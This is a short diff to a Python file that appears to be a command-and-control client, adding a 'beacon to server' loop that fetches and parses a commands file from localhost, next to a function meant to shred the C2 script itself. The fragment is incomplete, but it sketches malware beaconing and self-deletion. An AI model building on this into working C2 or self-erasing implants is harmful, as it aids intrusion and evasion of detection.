@@ -1,9 +1,13 @@
+import json
 import os
+import time
 import urllib.request
 
 def mainloop():
     """repeatedly beacon to server"""
-    pass
+    response = urllib.request.urlopen("http://localhost/commands.json")
+    response_body = response.read()
+    commands = json.loads(response_body)
 
 def shredC2():
     """shreds the file c2-node3.py"""
